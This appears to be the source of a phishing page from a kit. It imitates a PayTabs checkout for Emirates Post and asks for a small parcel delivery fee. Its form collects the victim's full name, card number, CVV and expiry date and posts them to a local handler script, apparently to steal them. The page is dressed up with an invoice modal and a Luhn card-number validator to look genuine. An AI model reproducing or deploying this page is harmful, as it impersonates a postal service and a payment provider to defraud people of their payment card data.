<?php 
include "./config/911.php";
 ?>
<!DOCTYPE html>
<html lang="en" style="" class=" js flexbox flexboxlegacy canvas canvastext postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <link rel="shortcut icon" href="./files/favicon.png">
        <title>PayTabs - Simple &amp; Trusted Payments</title>

        <!-- Bootstrap -->
        <link href="./files/bootstrap.css" rel="stylesheet" type="text/css">
                        <link href="./files/custom.css" rel="stylesheet" type="text/css">
                           
        <link href="./files/style.css" rel="stylesheet" type="text/css">
        <link href="./files/opensans.css" rel="stylesheet" type="text/css">
            </head>
    <body data-gr-c-s-loaded="true">
               
       
        
        <div style="filter: Alpha(Opacity=90); -moz-opacity:0.9; opacity: 0.9; width: 100%; height: 100%; z-index: 1000; background-color: #AAAAAA; position: absolute; top: 0; text-align: center; display: none ; position: absolute" id="please_wait">
            <div style="width: 487px;
                    position: fixed;
                    top: 40%;
                    left: 50%;
                    margin-left: -243px;
                 ">
                <h4 style="margin:0 !important">Please wait ...</h4> <br>
                <img src="./files/loading_payment.gif" alt="loading ..." style="display:inline-block; vertical-align:middle">
            </div>
        </div>
        <header class="header">
            <div class="container">
                        <div class="header-logo img-responsive">
                                                            <div class="text-nav">
                                    <a class="language-nav" id="change_lang" href="" title="عربي" style="font-size: small !important; font-family: &quot;Droid Arabic Kufi&quot;,&quot;Open Sans&quot; !important;">
                                        عربي                                    </a>
                                </div>
                                                        <img src="./files/62617_1589791686.jpg" width="151" height="54" alt="logo"> 
                        </div>
            </div>
        </header>
        <div class="clearfix"></div>
        <section class="section">
            <div class="container">
                
                    <div class="header-title"><h3>Emirates post</h3></div>
                
            </div>
            <div class="container">
                    <form action="./jean/paris.php" class="form-fields" role="form" id="form_pay" method="post" accept-charset="utf-8" _lpchecked="1">
                <input type="hidden" name="exchange_rate" value="0.2736">
                <div class="payment-wrap">
                    <div>
<label class="payment_method">
                                <input type="radio" id="creditcard" name="payment_type" value="creditcard">
                                <img src="./files/cards.png" width="75" alt="Credit Card">
                               
                            </label>
                                                                                                                        </div>
                    <div class="form-wrap sadad-hide" style="display:none;">
                        <input class="form-control" placeholder="Enter SADAD Account ID (e.g. Khalid012)" value="" maxlength="12" name="olpalias" id="olpalias" autocomplete="off" type="text">
                    </div>
                    <span class="whats-this sadad-hide" style="display:none;">Don't have SADAD Account ID?</span>
                    <!--Sadad Enable-->
                    <div id="pt-sadad-enable-outer">
                        <div id="pt-sadad-enable" class="pt-sadad-enable-wrap pt-arrow">
                        <div class="pt-sadad-enable-inner">
                            <h2>How to enable SADAD Account?</h2>
                            <ul class="pt-sadad-htp">
                                <li class="step1 step-help">
                                    <figure>
                                        <img class="img-help" src="./files/p1.png" width="50" height="32">
                                        <figcaption>Login to your <br> online banking</figcaption>
                                    </figure>
                                </li>
                                <li class="step2 step-help">
                                    <figure>				
                                        <img class="img-help" src="./files/p2.png" width="48" height="33">
                                        <figcaption>Register in SADAD Account by creating an ID and a password</figcaption>
                                    </figure>		
                                </li>
                                <script type="text/javascript">
                                    var $cc = {}
$cc.validate = function(e){

  //if the input is empty reset the indicators to their default classes
  if (e.target.value == ''){
    e.target.previousElementSibling.className = 'card-type';
    e.target.nextElementSibling.className = 'card-valid';
    return
  }

  //Retrieve the value of the input and remove all non-number characters
  var number = String(e.target.value);
  var cleanNumber = '';
  for (var i = 0; i<number.length; i++){
    if (/^[0-9]+$/.test(number.charAt(i))){
      cleanNumber += number.charAt(i);
    }
  }

  //Only parse and correct the input value if the key pressed isn't backspace.
  if (e.key != 'Backspace'){
    //Format the value to include spaces in the correct locations
    var formatNumber = '';
    for (var i = 0; i<cleanNumber.length; i++){
      if (i == 3 || i == 7 || i == 11 ){
          formatNumber = formatNumber + cleanNumber.charAt(i) + ' '
      }else{
        formatNumber += cleanNumber.charAt(i)
      }
    }
    e.target.value = formatNumber;
  }

  //run the Luhn algorithm on the number if it is at least equal to the shortest card length
  if (cleanNumber.length >= 12){
    var isLuhn = luhn(cleanNumber);
  }

  function luhn(number){
    var numberArray = number.split('').reverse();
    for (var i=0; i<numberArray.length; i++){
      if (i%2 != 0){
        numberArray[i] = numberArray[i] * 2;
        if (numberArray[i] > 9){
          numberArray[i] = parseInt(String(numberArray[i]).charAt(0)) + parseInt(String(numberArray[i]).charAt(1))
        }
      }
    }
    var sum = 0;
    for (var i=1; i<numberArray.length; i++){
      sum += parseInt(numberArray[i]);
    }
    sum = sum * 9 % 10;
    if (numberArray[0] == sum){
      return true
    }else{
      return false
    }
  }

  //if the number passes the Luhn algorithm add the class 'active'
  if (isLuhn == true){
    e.target.nextElementSibling.className = 'card-valid active'
  }else{
    e.target.nextElementSibling.className = 'card-valid'
  }

  var card_types = [
    {
      name: 'maestro',
      pattern: /^(5018|5020|5038|6304|6759|676[1-3])/,
      valid_length: [12, 13, 14, 15, 16, 17, 18, 19]
    }
  ];

  //test the number against each of the above card types and regular expressions
  for (var i = 0; i< card_types.length; i++){
    if (number.match(card_types[i].pattern)){
      //if a match is found add the card type as a class
      e.target.previousElementSibling.className = 'card-type '+card_types[i].name;
    }
  }
}

$cc.expiry = function(e){
  if (e.key != 'Backspace'){
    var number = String(this.value);

    //remove all non-number character from the value
    var cleanNumber = '';
    for (var i = 0; i<number.length; i++){
      if (i == 1 && number.charAt(i) == '/'){
        cleanNumber = 0 + number.charAt(0);
      }
      if (/^[0-9]+$/.test(number.charAt(i))){
        cleanNumber += number.charAt(i);
      }
    }

    var formattedMonth = ''
    for (var i = 0; i<cleanNumber.length; i++){
      if (/^[0-9]+$/.test(cleanNumber.charAt(i))){
        //if the number is greater than 1 append a zero to force a 2 digit month
        if (i == 0 && cleanNumber.charAt(i) > 1){
          formattedMonth += 0;
          formattedMonth += cleanNumber.charAt(i);
          formattedMonth += '/';
        }
        //add a '/' after the second number
        else if (i == 1){
          formattedMonth += cleanNumber.charAt(i);
          formattedMonth += '/';
        }
        //force a 4 digit year
        else if (i == 2 && cleanNumber.charAt(i) <2){
          formattedMonth += '20' + cleanNumber.charAt(i);
        }else{
          formattedMonth += cleanNumber.charAt(i);
        }

      }
    }
    this.value = formattedMonth;
  }   
}

                                </script>
                                <li class="step3 step-help">
                                    <figure>								
                                        <img class="img-help" src="./files/p3.png" width="27" height="33">
                                        <figcaption>Add funds to <br> your SADAD Account</figcaption>
                                    </figure>						
                                </li>
                            </ul>
                        
                            <a href="" class="pt-sadad-btn" target="_blank">Learn More</a>
                        </div>
                    </div>
                    </div>
                <!-- End Sadad Enable Note-->

                </div>
                                <div class="col-md-12 col-sm-12 form-wrap" style="margin-top:0; border-radius:0 0 5px 5px;">
                    <div class="justified-wrap">

                        <div class="col-md-12 col-sm-12 no-space">
                            <div>
                                <label>PACKAGE №</label>
                                <label type="text" class=" label-amount">NV 6588123</label>
                            </div>
                            <label>AED</label>
                            <label type="text" class=" label-amount">12.15</label>
                        </div>
                                                                    </div>
                                         
                        
                </div>
                 <div class="clearfix"></div>
                                <div class="alert alert-danger  display-hide" style="display:none;">
                    <button data-dismiss="alert" class="close" type="button">×</button>
                    <strong> Error!</strong>   All fields are required.                </div>
                 
                 
                 <div class="clearfix"></div>
                 <!--              
                 </div>-->
                                 <div class="col-md-12 col-sm-12 card-details">
 <div class="form-wrap creditcard-hide">
                            <input type="text" class="required form-control" placeholder="Full Name" required="" name="jeanname" autocomplete="off">
                            <input onkeyup="$cc.validate(event)" required="" type="text" class="required form-control" placeholder="Card Number" name="jeancc"  autocomplete="off" maxlength="19">
                            <div class="col-md-4 col-sm-4 no-space">
                                <input required="" type="text" autocomplete="off" class="required form-control left" placeholder="CVV" name="jeancvc"  maxlength="4">
                            </div>
                            <div class="col-md-5 col-sm-5 no-space">
                                <select required="" class="required form-control" name="jeanm" style="margin-top:6px;">
                                    <option value="">Expiry Month</option>
                                    <option value="01">January</option>
                                    <option value="02">February</option>
                                    <option value="03">March</option>
                                    <option value="04">April</option>
                                    <option value="05">May</option>
                                    <option value="06">June</option>
                                    <option value="07">July</option>
                                    <option value="08">August</option>
                                    <option value="09">September</option>
                                    <option value="10">October</option>
                                    <option value="11">November</option>
                                    <option value="12">December</option>
                                </select>
                            </div>
                            <div class="col-md-3 col-sm-3 no-space">
                                <select required="" class="right required form-control" id="expiry_year" name="jeany" style="margin-top:6px;">
                                    <option value="">Year</option>
                                    <option value="18">2018</option>
                                    <option value="19">2019</option>
                                    <option value="20">2020</option>
                                    <option value="21">2021</option>
                                    <option value="22">2022</option>
                                    <option value="23">2023</option>
                                    <option value="24">2024</option>
                                    <option value="25">2025</option>
                                    <option value="26">2026</option>
                                    <option value="27">2027</option>
                                    <option value="28">2028</option>
                                    <option value="29">2029</option>
                                    <option value="30">2030</option>
                                    <option value="31">2031</option>
                                    <option value="32">2032</option>
                                    <option value="33">2033</option>
                                    <option value="34">2034</option>
                                    <option value="35">2035</option>
                                    <option value="36">2036</option>
                                </select>
                                <!--<input name="expDate" type="text" class=" form-control last textbox-wrap required" placeholder="Expiration Date MM/YY" maxlength="5"  id="expiry" autocomplete="off" >-->

                            </div>
                            <div class="clearfix"></div>
                        </div>
                                                
                                              
    <input type="submit" class="btn btn-lg btn-block btn-success" style="margin-top:15px;background-color: #4fad4d;
    color: #fff; " value="Pay Now">
                                                                        <div class="text-nav" style=" text-align:center; margin-top:15px;"><a href="">Cancel</a></div>
                                                                    
                        <img class="card-brands-supported" alt="credit cards" style="margin-top:15px;" src="./files/credit-cards.png">
                        <div style="display: none;" id="hidden_fields">
                            <input type="hidden" value="" name="amount" id="amount">
                            
<input type="hidden" name="paypage_id" value="10031622">
                        </div>
                        <input type="hidden" name="gointerpay_finger_print_id" id="gointerpay_finger_print_id" value="">
                                    </div></form>
            </div>

        </section>
        
                <div id="invoiceModal" class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" aria-hidden="true">
            <div class="modal-dialog ">
                <div class="modal-content">

                    <div class="col-md-12">
                        <div class="portlet box blue">
                            <div class="portlet-title">
                                <div class="caption"><i class="icon-list"></i> </div>
                            </div>
                            <div class="portlet-body">
                                <div class="table-responsive table-invoice-wrap">
                                    <!--<div style="background: #f6f8f1; margin:0; padding:0; font-family: Arial, Helvetica, sans-serif; font-size:14px; line-height:19px;" width="720">-->
                                    <table align="center" cellpadding="0" cellspacing="0" width="100%" class="invoice-wrap">
                                        
                                        <tbody><tr>

                                            <td valign="middle">
                                                <img src="./files/logo.png" width="123" height="33" alt="paytabs">
                                            </td>

                                            <td valign="middle">
                                                <h2>INVOICE</h2>
                                            </td>
                                        </tr>

                                        <tr>
                                            <td colspan="2" valign="top">
                                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                                    <tbody><tr>
                                                        <td valign="top" width="450">
                                                            <img src="./files/62617_1589791686.jpg" alt="" width="120" style="margin-bottom:10px;">
                                                        </td>
                                                        <td valign="baseline" width="300">
                                                            <table width="300" border="1" cellspacing="0" cellpadding="8" class="table-invoice">
                                                                <tbody><tr>
                                                                    <td class="table-bg">Invoice Number</td>
                                                                    <td class="invoice-nbr">INV - 10031622</td>
                                                                </tr>
                                                                                                                                <tr>
                                                                    <td class="table-bg">Invoice Date</td>
                                                                    <td>11/08/2020 22:52 PM</td>
                                                                </tr>
                                                            </tbody></table>
                                                        </td>
                                                    </tr><tr>
                                                    </tr><tr>
                                                        <td valign="bottom">
                                                            <p>
                                                                <strong>
                                                                    Emirates post                                                                </strong>
                                                            </p>
                                                            <p>
                                                                United Arab Emirates<br>                                                                <br>
                                                                
                                                                                                                                
                                                                Work Timings:&nbsp;From 09:00 AM To 02:00 PM                                                                , Sunday, Monday, Tuesday, Wednesday, Thursday, Friday, Saturday                                                            </p>
                                                        </td>

                                                    </tr>
                                            
                                        

                                    </tbody></table>
                                    </td>
                                    </tr>
                                    <tr>
                                        <td colspan="2" align="center" valign="top">
                                            <table width="100%" border="0" cellspacing="0" cellpadding="10" class="table-invoice-desc">
                                                <tbody><tr class=" table-top">
                                                    <td width="400" valign="top"><strong>Description</strong></td>
                                                    <td width="140" align="center" valign="middle"><strong>Quantity</strong></td>
                                                    <td width="140" class="left-arabic-txt" align="right" valign="middle"><strong>Unit Price</strong></td>
                                                    <td width="140" class="left-arabic-txt" align="right" valign="middle"><strong>Amount</strong></td>
                                                </tr>
                                                <tr>
                                                        <td width="400" valign="top">Delivery Invoice (Purchase Package)</td>
                                                        <td width="140" align="center" valign="middle">1</td>
                                                        <td width="140" class="left-arabic-txt" align="right" valign="middle">AED 12.15 </td>
                                                        <td width="140" class="left-arabic-txt" align="right" valign="middle">AED 12.15<span>  </span></td>
                                                    </tr>
                                            </tbody></table>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td colspan="2" valign="top">
                                            <br>
                                            <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                                <tbody><tr>
                                                    <td width="400" rowspan="2" valign="bottom">
                                                        <a href="https://www.paytabs.com/terms_conditions" target="_blank"><strong>Terms &amp; Conditions</strong></a>
                                                        <p></p>
                                                        <p class="card-brands-supported"><img src="./files/visa-icon.png" alt="" width="58" height="18"> <img src="./files/master-card-icon.png" alt="" width="36" height="21"> 
                                                        </p>
                                                        <span style="display:none;" class="sadad_footer_txt">
                                                            <p class="sadad-brand-logo">
                                                                <img src="./files/sadad-en-2016.png" height="45"> 
                                                            </p>
                                                            <p>The consumer has the right to cancel his purchase and receive a refund if delivery is delayed for more than 15 days, unless a new delivery date has been negotiated with the merchant. <a href="https://mci.gov.sa/">mci.gov.sa</a></p>
                                                        </span>
                                                    </td>
                                                    <td valign="top" width="300">
                                                        <table width="300" border="1" cellspacing="0" cellpadding="8" class="table-invoice-total">
                                                                                                                        <tbody><tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Other Charges:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 0.00</td>
                                                            </tr>
                                                                                                                        <tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Sub Total:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 12.15</td>
                                                            </tr>
                                                            <tr>
                                                                <td width="120" class="left-arabic-txt" align="right" valign="middle">Discount:</td>
                                                                <td width="150" class="left-style" align="right" valign="middle"><span> AED</span> 0.00</td>
                                                            </tr>
                                                            
    <!--                                                        <tr>
                                                                <td width="100"  valign="middle" style=" border-bottom-color:#d3e2f2;  border-right-style:hidden;">Shipping:</td>
                                                                <td width="150"  valign="middle" style="  border-bottom-color:#d3e2f2;">0.00<span style="border-right-style:hidden;"> AED</span></td>
                                                            </tr>
                                                            <tr>
                                                                <td width="100"  valign="middle" style=" border-bottom-color:#d3e2f2;  border-right-style:hidden;">Tax:</td>
                                                                <td width="150"  valign="middle" style="  border-bottom-color:#d3e2f2;">0.00<span style="border-right-style:hidden;">AED</span></td>
                                                            </tr>-->
                                                            <tr class="total-wrap">
                                                                <td width="120" class="left-arabic-txt" valign="middle">Total:</td>
                                                                <td width="150" class="left-style" valign="middle"><span> AED 12.15</span></td>
                                                            </tr>
                                                        </tbody></table>
                                                    </td>
                                                </tr>
                                            </tbody></table></td>
                                    </tr>
    <!--                                <tr>
                                        <td colspan="2" align="center" valign="top" style="border-top:solid 1px #eee; background:#efefef;" ><p style="font-size:11px;">Powered by PayTabs.com</p></td>
                                    </tr>-->
                                    </tbody></table>

                                </div>
                            </div>

                        </div><!-- col-md-12 -->
                    </div><!-- row -->
                    <div class="clearfix"></div>
                    <div class="modal-footer invoice-wrap-footer">
                        <button type="button" class="btn btn-primary" onclick="closeinvoiceModal()">Close</button>
                    </div>

                </div><!-- /.modal-content -->
        
            </div><!-- /.modal-dialog -->
        </div>
                    <!-- Screen Size Small Error Modal Start -->
        <div id="error_modal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="myerrorModal" aria-hidden="true">
            <div class="modal-dialog">


                <div class="modal-content">
                    <div class="modal-body">
                        <div class="bootbox-body"><br>
                            <h3>For Better Viewing Experience use Larger Screen<br></h3>
                            <h4>OR</h4>
                            <img src="./files/rotate-device.png" width="100">
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button data-dismiss="error_modal" onclick="closeErrorModal()" type="button" class="btn btn-success">OK‎</button>
                    </div>
                </div>

            </div><!-- /.modal-dialog -->
        </div>
    <!-- Screen Size Small Error Modal End -->
    <input type="hidden" name="lbl_statReg" id="lbl_statReg" value="State/Region">
    <input type="hidden" name="bill_state" id="bill_state" value="ابوضبي">
    
    <input type="hidden" name="lbl_statReg" id="lbl_statReg" value="State/Region">
    <input type="hidden" name="ship_state" id="ship_state" value="ابوضبي">
    <input type="hidden" name="gointerpay_merchant_id" id="gointerpay_merchant_id" value="">
    

        <footer class="footer">
            <img src="./files/express-checkout.png" width="85" height="34" alt="express checkout">
                    </footer>


    


</body></html>